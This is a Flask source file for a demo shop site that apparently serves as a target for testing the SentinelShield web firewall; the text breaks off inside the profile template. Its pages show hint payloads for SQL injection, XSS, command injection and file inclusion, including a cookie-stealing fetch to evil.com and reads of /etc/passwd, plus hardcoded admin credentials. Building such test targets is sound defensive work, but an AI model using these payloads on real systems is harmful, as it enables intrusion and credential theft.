# ─────────────────────────────────────────────────────────────────
#  realistic_app.py — A Realistic Shopping Website
#  Protected by SentinelShield WAF
#
#  PAGES:
#  /          → Home page (product listings)
#  /login     → Login form  (test SQLi here)
#  /register  → Register form (test XSS here)
#  /search    → Product search (test SQLi, XSS here)
#  /product   → Product detail (test LFI here)
#  /profile   → User profile (test CMDi here)
#  /contact   → Contact form (test XSS, CMDi here)
#  /api/ping  → API endpoint (test CMDi, SSRF here)
#  /api/fetch → URL fetch endpoint (test SSRF here)
#
#  HOW TO RUN:
#    python realistic_app.py
#    Open: http://localhost:5000
# ─────────────────────────────────────────────────────────────────

from flask import Flask, request, jsonify, render_template_string, redirect, url_for, session
import httpx

app = Flask(__name__)
app.secret_key = 'sentinelshield-demo-key'

SENTINEL_URL = "http://localhost:8000/api/inspect"

# ── SentinelShield Middleware ─────────────────────────────────────
@app.before_request
def sentinel_check():
    if request.path.startswith('/static'):
        return None

    ip = (
        request.headers.get('X-Forwarded-For', '').split(',')[0].strip()
        or request.headers.get('X-Real-IP', '')
        or request.remote_addr
        or '127.0.0.1'
    )

    try:
        result = httpx.post(SENTINEL_URL, json={
            "ip":      ip,
            "method":  request.method,
            "path":    request.path,
            "query":   request.query_string.decode('utf-8', errors='replace'),
            "headers": dict(request.headers),
            "body":    request.get_data(as_text=True) or None,
        }, timeout=3.0)

        data    = result.json()
        verdict = data.get('verdict', 'ALLOW')
        score   = data.get('threat_score', 0)
        attacks = data.get('attack_types', [])
        geo     = data.get('geo', {})
        rules   = data.get('matches', [])

        if verdict == 'BLOCK':
            return render_template_string(BLOCK_PAGE,
                ip         = ip,
                score      = score,
                attacks    = ', '.join(attacks) if attacks else 'Security Policy Violation',
                country    = geo.get('country_name', 'Unknown'),
                request_id = data.get('request_id', 0),
                is_tor     = geo.get('is_tor', False),
                is_anomaly = data.get('is_anomaly', False),
                rules      = rules,
                severity   = data.get('severity', 'HIGH'),
            ), 403

    except Exception as e:
        print(f"⚠️  SentinelShield check failed: {e}")

    return None


# ── HOME PAGE ─────────────────────────────────────────────────────
@app.route('/')
def home():
    return render_template_string(HOME_PAGE)

# ── LOGIN PAGE ────────────────────────────────────────────────────
@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        if username == 'admin' and password == 'admin123':
            session['user'] = username
            return redirect('/')
        elif username and password:
            error = f"Invalid credentials for user: {username}"
        else:
            error = "Please fill in all fields"
    return render_template_string(LOGIN_PAGE, error=error)

# ── REGISTER PAGE ─────────────────────────────────────────────────
@app.route('/register', methods=['GET', 'POST'])
def register():
    success = None
    error   = None
    if request.method == 'POST':
        name    = request.form.get('name', '')
        email   = request.form.get('email', '')
        password= request.form.get('password', '')
        if name and email and password:
            success = f"Account created for {name}!"
        else:
            error = "Please fill all fields"
    return render_template_string(REGISTER_PAGE, success=success, error=error)

# ── SEARCH PAGE ───────────────────────────────────────────────────
@app.route('/search')
def search():
    query    = request.args.get('q', '')
    category = request.args.get('category', 'all')
    min_price= request.args.get('min', '')
    max_price= request.args.get('max', '')
    return render_template_string(SEARCH_PAGE,
        query=query, category=category,
        min_price=min_price, max_price=max_price
    )

# ── PRODUCT DETAIL ────────────────────────────────────────────────
@app.route('/product')
def product():
    product_id = request.args.get('id', '1')
    file_path  = request.args.get('file', '')
    review     = request.args.get('review', '')
    return render_template_string(PRODUCT_PAGE,
        product_id=product_id, file_path=file_path, review=review
    )

# ── USER PROFILE ──────────────────────────────────────────────────
@app.route('/profile')
def profile():
    user_id  = request.args.get('id', '1')
    cmd      = request.args.get('debug', '')
    redirect_= request.args.get('redirect', '')
    return render_template_string(PROFILE_PAGE,
        user_id=user_id, cmd=cmd, redirect_url=redirect_
    )

# ── CONTACT FORM ──────────────────────────────────────────────────
@app.route('/contact', methods=['GET', 'POST'])
def contact():
    success = None
    if request.method == 'POST':
        name    = request.form.get('name', '')
        email   = request.form.get('email', '')
        message = request.form.get('message', '')
        subject = request.form.get('subject', '')
        if name and message:
            success = f"Message from {name} received!"
    return render_template_string(CONTACT_PAGE, success=success)

# ── API: PING (CMDi target) ───────────────────────────────────────
@app.route('/api/ping')
def api_ping():
    host   = request.args.get('host', 'localhost')
    port   = request.args.get('port', '80')
    format_= request.args.get('format', 'json')
    return jsonify({
        "host":   host,
        "port":   port,
        "status": "reachable",
        "latency":"12ms"
    })

# ── API: FETCH (SSRF target) ──────────────────────────────────────
@app.route('/api/fetch')
def api_fetch():
    url      = request.args.get('url', '')
    callback = request.args.get('callback', '')
    proxy    = request.args.get('proxy', '')
    return jsonify({
        "url":    url,
        "status": "fetched",
        "size":   "2048 bytes"
    })

# ── API: USER DATA (SQLi target) ──────────────────────────────────
@app.route('/api/user')
def api_user():
    user_id  = request.args.get('id', '1')
    order_by = request.args.get('sort', 'name')
    filter_  = request.args.get('filter', '')
    return jsonify({
        "id":    user_id,
        "name":  "Demo User",
        "email": "user@demoshop.com",
        "role":  "customer"
    })


# ═══════════════════════════════════════════════════════════════════
# HTML TEMPLATES
# ═══════════════════════════════════════════════════════════════════

BASE_STYLE = """
<link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@300;400;500;600;700&family=DM+Mono&display=swap" rel="stylesheet">
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{font-family:'DM Sans',sans-serif;background:#f7f8fc;color:#1a1a2e}
  header{background:#1a1a2e;color:#fff;padding:0 40px;height:60px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;box-shadow:0 2px 10px rgba(0,0,0,0.3)}
  .logo{font-size:20px;font-weight:700;color:#fff;text-decoration:none}
  .logo span{color:#ff6b35}
  nav a{color:#aaa;text-decoration:none;margin-left:24px;font-size:14px;transition:color 0.2s}
  nav a:hover{color:#fff}
  .badge-protected{background:#00ff9922;border:1px solid #00ff9944;color:#00ff99;padding:3px 10px;border-radius:20px;font-size:11px;font-family:'DM Mono',monospace}
  .container{max-width:1100px;margin:0 auto;padding:0 20px}
  .btn{display:inline-block;padding:10px 24px;border-radius:6px;font-size:14px;font-weight:600;cursor:pointer;border:none;transition:all 0.2s;text-decoration:none}
  .btn-primary{background:#1a1a2e;color:#fff}
  .btn-primary:hover{background:#2a2a4e}
  .btn-danger{background:#ff4444;color:#fff}
  .btn-outline{background:transparent;border:1px solid #ddd;color:#555}
  .btn-outline:hover{background:#f0f0f0}
  input,textarea,select{width:100%;padding:10px 14px;border:1px solid #e0e0e0;border-radius:6px;font-size:14px;font-family:'DM Sans',sans-serif;outline:none;transition:border 0.2s;background:#fff}
  input:focus,textarea:focus,select:focus{border-color:#1a1a2e;box-shadow:0 0 0 3px rgba(26,26,46,0.1)}
  label{display:block;font-size:13px;font-weight:600;color:#555;margin-bottom:5px}
  .form-group{margin-bottom:16px}
  .card{background:#fff;border-radius:10px;box-shadow:0 2px 8px rgba(0,0,0,0.06);border:1px solid #eee}
  .error-msg{background:#fff5f5;border:1px solid #ffc0c0;color:#cc2222;padding:10px 14px;border-radius:6px;font-size:13px;margin-bottom:16px}
  .success-msg{background:#f0fff4;border:1px solid #9ae6b4;color:#276749;padding:10px 14px;border-radius:6px;font-size:13px;margin-bottom:16px}
  .hint-box{background:#fffbeb;border:1px solid #f6d860;border-radius:6px;padding:10px 14px;font-size:12px;color:#856404;margin-top:8px;font-family:'DM Mono',monospace}
  footer{background:#1a1a2e;color:#556;text-align:center;padding:20px;font-size:12px;margin-top:60px}
  footer a{color:#5577ff;text-decoration:none}
</style>
"""

BLOCK_PAGE = """<!DOCTYPE html>
<html>
<head>
  <title>Blocked — SentinelShield</title>
  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@600;700&display=swap" rel="stylesheet">
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{background:#050510;font-family:'Rajdhani',sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;color:#c0c0d0}
    .wrap{width:580px;padding:40px;background:#0a0a1a;border:1px solid #ff4d4d44;border-radius:12px;box-shadow:0 0 60px #ff4d4d18;animation:fadeIn 0.4s ease}
    @keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
    .shield{font-size:56px;text-align:center;margin-bottom:12px}
    h1{text-align:center;color:#ff4d4d;font-size:30px;letter-spacing:5px;margin-bottom:4px}
    .sub{text-align:center;font-size:11px;color:#334;letter-spacing:3px;margin-bottom:28px;font-family:'Share Tech Mono',monospace}
    .grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:20px}
    .info{background:#050510;border:1px solid #1a1a3e;border-radius:6px;padding:12px}
    .info-label{font-size:9px;color:#334;letter-spacing:2px;font-family:'Share Tech Mono',monospace;margin-bottom:4px}
    .info-value{font-size:14px;color:#ff4d4d;font-family:'Share Tech Mono',monospace}
    .info-value.orange{color:#ff9900}
    .info-value.blue{color:#5577ff}
    .rules{margin-bottom:16px}
    .rule-row{display:flex;justify-content:space-between;padding:7px 10px;background:#050510;border-radius:4px;margin-bottom:4px;border:1px solid #0d0d20;font-size:11px}
    .rule-id{color:#5577ff;font-family:'Share Tech Mono',monospace}
    .rule-name{color:#778;flex:1;margin:0 10px}
    .rule-score{color:#ff4d4d;font-family:'Share Tech Mono',monospace}
    .badges{display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap}
    .badge{font-size:10px;padding:3px 10px;border-radius:3px;border:1px solid;font-family:'Share Tech Mono',monospace}
    .tor{color:#00ccff;background:#00ccff15;border-color:#00ccff33}
    .ml{color:#cc44ff;background:#cc44ff15;border-color:#cc44ff33}
    .crit{color:#ff0033;background:#ff003315;border-color:#ff003333}
    .msg{font-size:12px;color:#556;text-align:center;line-height:1.7;margin-bottom:20px}
    .back{display:block;text-align:center;background:#1a1a2e;border:1px solid #334;color:#778;padding:10px 24px;border-radius:6px;text-decoration:none;font-size:12px;letter-spacing:2px;transition:all 0.2s}
    .back:hover{border-color:#5577ff;color:#aabbff}
    .ref{text-align:center;font-size:10px;color:#223;margin-top:12px;font-family:'Share Tech Mono',monospace}
    .sev-bar{height:3px;border-radius:2px;margin-bottom:20px;box-shadow:0 0 8px currentColor}
  </style>
</head>
<body>
<div class="wrap">
  <div style="height:3px;background:{% if severity=='CRITICAL' %}#ff0033{% elif severity=='HIGH' %}#ff4d4d{% else %}#ff9900{% endif %};border-radius:2px 2px 0 0;margin:-40px -40px 30px;box-shadow:0 0 15px currentColor"></div>
  <div class="shield">🛡️</div>
  <h1>ACCESS BLOCKED</h1>
  <div class="sub">SENTINELSHIELD INTRUSION DETECTION SYSTEM</div>

  <div class="grid">
    <div class="info">
      <div class="info-label">YOUR IP ADDRESS</div>
      <div class="info-value">{{ ip }}</div>
    </div>
    <div class="info">
      <div class="info-label">THREAT SCORE</div>
      <div class="info-value">{{ score }}/100</div>
    </div>
    <div class="info">
      <div class="info-label">ATTACK DETECTED</div>
      <div class="info-value orange">{{ attacks }}</div>
    </div>
    <div class="info">
      <div class="info-label">YOUR LOCATION</div>
      <div class="info-value blue">{{ country }}</div>
    </div>
  </div>

  {% if is_tor or is_anomaly or severity == 'CRITICAL' %}
  <div class="badges">
    {% if severity == 'CRITICAL' %}<span class="badge crit">🚨 CRITICAL SEVERITY</span>{% endif %}
    {% if is_tor %}<span class="badge tor">🧅 TOR EXIT NODE</span>{% endif %}
    {% if is_anomaly %}<span class="badge ml">🤖 ML ANOMALY DETECTED</span>{% endif %}
  </div>
  {% endif %}

  {% if rules %}
  <div class="rules">
    {% for rule in rules %}
    <div class="rule-row">
      <span class="rule-id">{{ rule.rule_id }}</span>
      <span class="rule-name">{{ rule.rule_name }}</span>
      <span class="rule-score">+{{ rule.score }}pts</span>
    </div>
    {% endfor %}
  </div>
  {% endif %}

  <p class="msg">
    Your request was identified as <strong style="color:#ff4d4d">{{ attacks }}</strong> and blocked
    by our Web Application Firewall. This incident has been logged, your IP has been
    flagged, and our security team has been notified.
  </p>

  <a href="/" class="back">← GO BACK TO SHOP</a>
  <div class="ref">INCIDENT REFERENCE: #{{ request_id }} · {{ attacks|upper }}</div>
</div>
</body>
</html>"""


HOME_PAGE = """<!DOCTYPE html>
<html>
<head>
  <title>ShopZone — Online Store</title>
  """ + BASE_STYLE + """
  <style>
    .hero{background:linear-gradient(135deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%);color:#fff;padding:70px 40px;text-align:center}
    .hero h1{font-size:42px;font-weight:700;margin-bottom:12px}
    .hero p{color:#aaa;font-size:16px;margin-bottom:30px}
    .hero-btns{display:flex;gap:12px;justify-content:center}
    .products{padding:50px 0}
    .products h2{font-size:24px;font-weight:700;margin-bottom:24px}
    .product-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:20px}
    .product-card{background:#fff;border-radius:10px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.06);border:1px solid #eee;transition:transform 0.2s,box-shadow 0.2s}
    .product-card:hover{transform:translateY(-3px);box-shadow:0 8px 20px rgba(0,0,0,0.1)}
    .product-img{background:linear-gradient(135deg,#f0f4ff,#e8ecf8);height:180px;display:flex;align-items:center;justify-content:center;font-size:60px}
    .product-info{padding:16px}
    .product-name{font-weight:600;margin-bottom:4px;font-size:15px}
    .product-price{color:#1a1a2e;font-weight:700;font-size:18px;margin-bottom:8px}
    .product-rating{color:#f6ad55;font-size:13px;margin-bottom:10px}
    .categories{background:#fff;padding:30px 0;border-bottom:1px solid #eee}
    .cat-grid{display:flex;gap:12px;overflow-x:auto;padding-bottom:8px}
    .cat-btn{white-space:nowrap;padding:8px 18px;border-radius:20px;border:1px solid #ddd;background:#f7f8fc;font-size:13px;cursor:pointer;text-decoration:none;color:#555;transition:all 0.2s}
    .cat-btn:hover,.cat-btn.active{background:#1a1a2e;color:#fff;border-color:#1a1a2e}
    .pentest-panel{background:#1a1a2e;color:#fff;padding:30px 40px;margin:40px 0;border-radius:12px}
    .pentest-panel h3{color:#ff6b35;margin-bottom:8px;font-size:18px}
    .pentest-panel p{color:#778;font-size:13px;margin-bottom:16px}
    .pentest-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
    .pentest-link{background:#0a0a20;border:1px solid #2a2a4e;color:#aabbff;padding:10px 14px;border-radius:6px;text-decoration:none;font-size:13px;display:block;transition:all 0.2s}
    .pentest-link:hover{border-color:#5577ff;color:#fff}
    .pentest-link span{display:block;color:#556;font-size:11px;margin-top:3px;font-family:'DM Mono',monospace}
  </style>
</head>
<body>
<header>
  <a href="/" class="logo">Shop<span>Zone</span></a>
  <nav>
    <a href="/">Home</a>
    <a href="/search">Products</a>
    <a href="/contact">Contact</a>
    <a href="/login">Login</a>
    <a href="/register">Register</a>
  </nav>
  <span class="badge-protected">🛡️ WAF Protected</span>
</header>

<div class="hero">
  <h1>Welcome to ShopZone</h1>
  <p>Your favourite online store — protected by SentinelShield WAF</p>
  <div class="hero-btns">
    <a href="/search" class="btn btn-primary" style="background:#ff6b35;border:none">Shop Now</a>
    <a href="/login" class="btn btn-outline" style="color:#fff;border-color:#fff">Sign In</a>
  </div>
</div>

<div style="background:#fff;border-bottom:1px solid #eee;padding:12px 40px;font-size:13px;color:#556">
  🛡️ All requests are inspected by SentinelShield in real-time ·
  <a href="http://localhost:3000" target="_blank" style="color:#5577ff">View Dashboard</a> ·
  Your IP: <strong id="ip">loading...</strong>
  <script>fetch('/api/user?id=1').then(r=>r.json()).then(()=>{document.getElementById('ip').innerText=window.location.hostname==='localhost'?'127.0.0.1 (local)':'your public IP'})</script>
</div>

<div class="container">

  <!-- Pentest Panel -->
  <div class="pentest-panel">
    <h3>🔴 Penetration Testing Panel</h3>
    <p>Try injecting attacks manually in each page's input fields. Every request is analyzed by SentinelShield in real-time.</p>
    <div class="pentest-grid">
      <a href="/login" class="pentest-link">
        🔑 Login Page
        <span>Test: SQL Injection, Brute Force</span>
      </a>
      <a href="/search" class="pentest-link">
        🔍 Search Page
        <span>Test: SQLi, XSS, Template Injection</span>
      </a>
      <a href="/product?id=1" class="pentest-link">
        📦 Product Page
        <span>Test: LFI, Path Traversal</span>
      </a>
      <a href="/register" class="pentest-link">
        📝 Register Page
        <span>Test: XSS, HTML Injection</span>
      </a>
      <a href="/contact" class="pentest-link">
        📧 Contact Form
        <span>Test: XSS, Command Injection</span>
      </a>
      <a href="/profile?id=1" class="pentest-link">
        👤 Profile Page
        <span>Test: CMDi, SSRF, Open Redirect</span>
      </a>
      <a href="/api/ping?host=localhost" class="pentest-link">
        ⚙️ Ping API
        <span>Test: Command Injection</span>
      </a>
      <a href="/api/fetch?url=https://google.com" class="pentest-link">
        🌐 Fetch API
        <span>Test: SSRF, Internal Access</span>
      </a>
      <a href="/api/user?id=1" class="pentest-link">
        👥 User API
        <span>Test: SQL Injection, Data Leak</span>
      </a>
    </div>
  </div>

  <!-- Products -->
  <div class="products">
    <h2>Featured Products</h2>
    <div class="product-grid">
      <div class="product-card">
        <div class="product-img">👟</div>
        <div class="product-info">
          <div class="product-name">Running Shoes Pro</div>
          <div class="product-price">₹2,499</div>
          <div class="product-rating">★★★★★ (128)</div>
          <a href="/product?id=1" class="btn btn-primary" style="font-size:13px;padding:7px 16px">View</a>
        </div>
      </div>
      <div class="product-card">
        <div class="product-img">👕</div>
        <div class="product-info">
          <div class="product-name">Cotton T-Shirt</div>
          <div class="product-price">₹599</div>
          <div class="product-rating">★★★★☆ (89)</div>
          <a href="/product?id=2" class="btn btn-primary" style="font-size:13px;padding:7px 16px">View</a>
        </div>
      </div>
      <div class="product-card">
        <div class="product-img">💻</div>
        <div class="product-info">
          <div class="product-name">Laptop Stand</div>
          <div class="product-price">₹1,299</div>
          <div class="product-rating">★★★★★ (203)</div>
          <a href="/product?id=3" class="btn btn-primary" style="font-size:13px;padding:7px 16px">View</a>
        </div>
      </div>
      <div class="product-card">
        <div class="product-img">🎧</div>
        <div class="product-info">
          <div class="product-name">Wireless Earbuds</div>
          <div class="product-price">₹3,999</div>
          <div class="product-rating">★★★★☆ (456)</div>
          <a href="/product?id=4" class="btn btn-primary" style="font-size:13px;padding:7px 16px">View</a>
        </div>
      </div>
    </div>
  </div>

</div>

<footer>
  ShopZone v1.0 · Protected by <strong style="color:#00ff99">SentinelShield v2.0</strong> ·
  <a href="http://localhost:3000">Dashboard</a> ·
  <a href="http://localhost:8000/docs">API Docs</a>
</footer>
</body>
</html>"""


LOGIN_PAGE = """<!DOCTYPE html>
<html>
<head>
  <title>Login — ShopZone</title>
  """ + BASE_STYLE + """
  <style>
    body{display:flex;align-items:center;justify-content:center;min-height:100vh;background:#f0f2f5}
    .login-wrap{display:grid;grid-template-columns:1fr 1fr;width:800px;background:#fff;border-radius:12px;overflow:hidden;box-shadow:0 10px 40px rgba(0,0,0,0.12)}
    .login-left{background:linear-gradient(135deg,#1a1a2e,#0f3460);padding:50px;color:#fff;display:flex;flex-direction:column;justify-content:center}
    .login-left h2{font-size:28px;margin-bottom:12px}
    .login-left p{color:#778;font-size:14px;line-height:1.7;margin-bottom:24px}
    .attack-hints h4{color:#ff6b35;font-size:13px;margin-bottom:10px}
    .hint{background:#0a0a20;border:1px solid #2a2a4e;border-radius:5px;padding:8px 12px;margin-bottom:6px;font-size:12px;font-family:'DM Mono',monospace;color:#aabbff}
    .hint .label{color:#556;font-size:10px;display:block;margin-bottom:2px}
    .login-right{padding:50px}
    .login-right h3{font-size:22px;font-weight:700;margin-bottom:4px}
    .login-right .sub{color:#888;font-size:13px;margin-bottom:28px}
  </style>
</head>
<body>
<div class="login-wrap">
  <div class="login-left">
    <div style="font-size:40px;margin-bottom:16px">🔑</div>
    <h2>Login to ShopZone</h2>
    <p>This login form is a SQL Injection testing target. Try different payloads in the username and password fields.</p>

    <div class="attack-hints">
      <h4>💉 SQL Injection Payloads to Try:</h4>
      <div class="hint">
        <span class="label">Classic OR bypass:</span>
        admin' OR '1'='1
      </div>
      <div class="hint">
        <span class="label">Comment terminator:</span>
        admin'--
      </div>
      <div class="hint">
        <span class="label">UNION SELECT:</span>
        ' UNION SELECT 1,2,3--
      </div>
      <div class="hint">
        <span class="label">Time-based blind:</span>
        ' OR SLEEP(5)--
      </div>
      <div class="hint">
        <span class="label">Normal login (ALLOW):</span>
        admin / admin123
      </div>
    </div>
  </div>

  <div class="login-right">
    <div class="badge-protected" style="margin-bottom:20px;display:inline-block">🛡️ Protected by SentinelShield</div>
    <h3>Welcome back</h3>
    <div class="sub">Sign in to your account</div>

    {% if error %}
    <div class="error-msg">❌ {{ error }}</div>
    {% endif %}

    <form method="POST">
      <div class="form-group">
        <label>Username</label>
        <input type="text" name="username" placeholder="Enter username" autocomplete="off" />
        <div class="hint-box">Try: admin'-- or ' OR 1=1--</div>
      </div>
      <div class="form-group">
        <label>Password</label>
        <input type="password" name="password" placeholder="Enter password" />
        <div class="hint-box">Try: anything (if SQLi works, bypass auth)</div>
      </div>
      <button type="submit" class="btn btn-primary" style="width:100%;padding:12px">Sign In</button>
    </form>

    <p style="text-align:center;margin-top:16px;font-size:13px;color:#888">
      Don't have an account? <a href="/register" style="color:#1a1a2e;font-weight:600">Register</a>
    </p>
    <p style="text-align:center;margin-top:8px"><a href="/" style="color:#888;font-size:13px">← Back to Home</a></p>
  </div>
</div>
</body>
</html>"""


SEARCH_PAGE = """<!DOCTYPE html>
<html>
<head>
  <title>Search — ShopZone</title>
  """ + BASE_STYLE + """
  <style>
    .search-header{background:#1a1a2e;padding:30px 40px;color:#fff}
    .search-bar{display:flex;gap:10px;max-width:700px}
    .search-bar input{background:#fff;border:none;padding:12px 16px;border-radius:6px;font-size:15px}
    .search-bar button{background:#ff6b35;color:#fff;border:none;padding:12px 24px;border-radius:6px;cursor:pointer;font-size:14px;font-weight:600;white-space:nowrap}
    .filters{background:#fff;border-bottom:1px solid #eee;padding:16px 40px;display:flex;gap:12px;align-items:center}
    .hints-bar{background:#fffbeb;border-bottom:1px solid #f6d860;padding:10px 40px;font-size:12px;color:#856404;font-family:'DM Mono',monospace}
  </style>
</head>
<body>
<header>
  <a href="/" class="logo">Shop<span>Zone</span></a>
  <nav><a href="/">Home</a><a href="/search">Products</a><a href="/login">Login</a></nav>
  <span class="badge-protected">🛡️ WAF Protected</span>
</header>

<div class="search-header">
  <h2 style="margin-bottom:16px">🔍 Product Search</h2>
  <form method="GET" class="search-bar">
    <input name="q" value="{{ query }}" placeholder="Search products... (try injecting here!)" />
    <button type="submit">Search</button>
  </form>
</div>

<div class="hints-bar">
  💉 Attack hints — SQLi: <strong>shoes' UNION SELECT username,password FROM users--</strong> &nbsp;|&nbsp;
  XSS: <strong>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</strong> &nbsp;|&nbsp;
  Template: <strong>{{"{{"}}7*7{{"}}"}}</strong>
</div>

<div class="filters">
  <form method="GET" style="display:flex;gap:10px;align-items:center;width:100%">
    <input type="hidden" name="q" value="{{ query }}">
    <label style="margin:0;white-space:nowrap">Category:</label>
    <select name="category" style="width:150px">
      <option value="all">All</option>
      <option value="shoes">Shoes</option>
      <option value="clothing">Clothing</option>
      <option value="electronics">Electronics</option>
    </select>
    <label style="margin:0">Min ₹:</label>
    <input name="min" value="{{ min_price }}" style="width:100px" placeholder="0">
    <label style="margin:0">Max ₹:</label>
    <input name="max" value="{{ max_price }}" style="width:100px" placeholder="10000">
    <button type="submit" class="btn btn-outline" style="white-space:nowrap">Apply Filters</button>
  </form>
</div>

<div class="container" style="padding-top:30px">
  {% if query %}
  <p style="margin-bottom:20px;color:#555">Showing results for: <strong>"{{ query }}"</strong></p>
  <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:16px">
    <div class="card" style="padding:16px">
      <div style="font-size:40px;text-align:center;margin-bottom:10px">👟</div>
      <div style="font-weight:600">Running Shoes</div>
      <div style="color:#1a1a2e;font-weight:700;margin:4px 0">₹2,499</div>
      <a href="/product?id=1&review={{ query }}" class="btn btn-primary" style="font-size:12px;padding:6px 12px">View</a>
    </div>
    <div class="card" style="padding:16px">
      <div style="font-size:40px;text-align:center;margin-bottom:10px">👕</div>
      <div style="font-weight:600">Cotton T-Shirt</div>
      <div style="color:#1a1a2e;font-weight:700;margin:4px 0">₹599</div>
      <a href="/product?id=2" class="btn btn-primary" style="font-size:12px;padding:6px 12px">View</a>
    </div>
  </div>
  {% else %}
  <p style="color:#888;text-align:center;padding:40px">Enter a search query above to find products</p>
  {% endif %}
</div>

<footer>ShopZone · <a href="http://localhost:3000">Dashboard</a></footer>
</body>
</html>"""


PRODUCT_PAGE = """<!DOCTYPE html>
<html>
<head>
  <title>Product — ShopZone</title>
  """ + BASE_STYLE + """
</head>
<body>
<header>
  <a href="/" class="logo">Shop<span>Zone</span></a>
  <nav><a href="/">Home</a><a href="/search">Products</a><a href="/login">Login</a></nav>
  <span class="badge-protected">🛡️ WAF Protected</span>
</header>

<div class="container" style="padding-top:40px">
  <div style="display:grid;grid-template-columns:1fr 1fr;gap:40px">

    <div>
      <div class="card" style="height:300px;display:flex;align-items:center;justify-content:center;font-size:100px;background:linear-gradient(135deg,#f0f4ff,#e8ecf8)">👟</div>
    </div>

    <div>
      <div class="badge-protected" style="margin-bottom:12px;display:inline-block">🛡️ Protected</div>
      <h1 style="font-size:28px;margin-bottom:8px">Product #{{ product_id }}</h1>
      <div style="font-size:24px;font-weight:700;color:#ff6b35;margin-bottom:16px">₹2,499</div>
      <div class="card" style="padding:20px;margin-bottom:20px">
        <h3 style="margin-bottom:12px;font-size:14px;color:#888">🎯 LFI / Path Traversal Testing</h3>
        <form method="GET">
          <input type="hidden" name="id" value="{{ product_id }}">
          <div class="form-group">
            <label>Load product file (test LFI here):</label>
            <input name="file" value="{{ file_path }}" placeholder="e.g. ../../../../etc/passwd" />
            <div class="hint-box">Try: ../../../../etc/passwd or php://filter/convert.base64-encode/resource=../config.py</div>
          </div>
          <button type="submit" class="btn btn-primary" style="font-size:13px">Load File</button>
        </form>
      </div>

      <div class="card" style="padding:20px">
        <h3 style="margin-bottom:12px;font-size:14px;color:#888">💬 Add Review (test XSS here)</h3>
        <form method="GET">
          <input type="hidden" name="id" value="{{ product_id }}">
          <div class="form-group">
            <label>Your Review:</label>
            <textarea name="review" rows="3" placeholder="Write your review here... or try XSS!">{{ review }}</textarea>
            <div class="hint-box">Try: &lt;script&gt;alert(document.cookie)&lt;/script&gt; or &lt;img src=x onerror=alert(1)&gt;</div>
          </div>
          <button type="submit" class="btn btn-primary" style="font-size:13px">Submit Review</button>
        </form>
      </div>
    </div>

  </div>
</div>
<footer>ShopZone · <a href="http://localhost:3000">Dashboard</a></footer>
</body>
</html>"""


CONTACT_PAGE = """<!DOCTYPE html>
<html>
<head>
  <title>Contact — ShopZone</title>
  """ + BASE_STYLE + """
</head>
<body>
<header>
  <a href="/" class="logo">Shop<span>Zone</span></a>
  <nav><a href="/">Home</a><a href="/search">Products</a><a href="/login">Login</a></nav>
  <span class="badge-protected">🛡️ WAF Protected</span>
</header>
<div class="container" style="padding:40px 20px;max-width:700px">
  <div class="badge-protected" style="margin-bottom:16px;display:inline-block">🛡️ Protected by SentinelShield</div>
  <h1 style="margin-bottom:4px">Contact Us</h1>
  <p style="color:#888;margin-bottom:24px">Test XSS and Command Injection in this form</p>

  {% if success %}
  <div class="success-msg">✅ {{ success }}</div>
  {% endif %}

  <div class="card" style="padding:28px">
    <form method="POST">
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
        <div class="form-group">
          <label>Your Name</label>
          <input name="name" placeholder="John Doe" />
          <div class="hint-box">Try XSS: &lt;script&gt;alert(1)&lt;/script&gt;</div>
        </div>
        <div class="form-group">
          <label>Email</label>
          <input name="email" type="email" placeholder="john@example.com" />
        </div>
      </div>
      <div class="form-group">
        <label>Subject</label>
        <input name="subject" placeholder="Order inquiry" />
        <div class="hint-box">Try CMDi: test; cat /etc/passwd</div>
      </div>
      <div class="form-group">
        <label>Message</label>
        <textarea name="message" rows="5" placeholder="Your message here..."></textarea>
        <div class="hint-box">Try XSS: &lt;img src=x onerror=fetch('http://evil.com?c='+document.cookie)&gt;</div>
      </div>
      <button type="submit" class="btn btn-primary" style="width:100%;padding:12px">Send Message</button>
    </form>
  </div>
</div>
<footer>ShopZone · <a href="http://localhost:3000">Dashboard</a></footer>
</body>
</html>"""


PROFILE_PAGE = """<!DOCTYPE html>
<html>
<head>
  <title>Profile — ShopZone</title>
  """ + BASE_STYLE + """
</head>
<body>
<header>
  <a href="/" class="logo">Shop<span>Zone</span></a>
  <nav><a href="/">Home</a><a href="/search">Products</a><a href="/login">Login</a></nav>
  <span class="badge-protected">🛡️ WAF Protected</span>
</header>
<div class="container" style="padding:40px 20px;max-width:800px">
  <h1 style="margin-bottom:24px">👤 User Profile #{{ user_id }}</h1>

  <div style="display:grid;grid-template-columns:1fr 1fr;gap:20px">

    <div class="card" style="padding:20px">
      <h3 style="margin-bottom:16px;color:#888;font-size:14px">⚡ Command Injection Test</h3>
      <form method="GET">
        <input type="hidden" name="id" value="{{ user_id }}">
        <div class="form-group">
          <label>Debug command:</label>
          <input name="debug" value="{{ cmd }}" placeholder="e.g. whoami" />
          <div class="hint-box">Try: whoami | cat /etc/passwd</div>
          <div class="hint-box">Try: ; ls -la /etc/</div>
          <div class="hint-box">Try: $(id)</div>
        </div>
        <button type="submit" class="btn btn-primary" style="font-size:13px">Run Debug</button>
      </form>
    </div>

    <div class="card" style="padding:20px">
      <h3 style="margin-bottom:16px;color:#888;font-size:14px">🌐 SSRF / Open Redirect Test</h3>
      <form method="GET">
        <input type="hidden" name="id" value="{{ user_id }}">
        <div class="form-group">
          <label>Redirect URL:</label>
          <input name="redirect" value="{{ redirect_url }}" placeholder="https://example.com" />
